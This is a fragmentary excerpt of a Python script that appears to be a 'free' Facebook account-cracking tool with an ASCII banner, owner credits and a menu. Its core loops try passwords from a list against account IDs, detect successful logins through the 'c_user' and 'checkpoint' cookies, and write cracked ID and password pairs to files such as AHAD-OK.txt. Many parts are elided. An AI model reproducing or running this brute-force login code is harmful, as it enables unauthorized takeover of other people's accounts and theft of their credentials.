...
try:
	prox= requests.get('https://github.com/HACKERBOYAHADFB/RANDOM-FREE/blob/main/YouTube.txt').text
...
logo=("""\033[1;97m
 ...
 /_/    \_\_|  |_/_/    \_\_____/  
\33[1;37m----------------------------------------------
→   Owner         :  HACKER ACADEMY 
→   Facebook   :  ABDUL AHAD 
→   YouTube     :  GOGON ABIR
→   Github        :  HACKERBOYAHADFB
→   Tool Type   :  \x1b[1;91mFREE
\x1b[1;97m→   Version    :  8.0
\33[1;37m----------------------------------------------""")
def linex():
	print('\33[1;37m----------------------------------------------')
loop = 0
...
def menu():
			...
			if rifat in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/groups/4507661069337157/?ref=share');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mAHAD\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[AHAD-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/AHAD-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[AHAD-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/AHAD-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[AHAD-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/AHAD-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[AHAD-OK] '+cid+' | '+ps+'\033[1;32m')
				open('AHAD-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[AHAD-CP] '+cid+' | '+ps+'\33[0;97m')
				open('AHAD-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
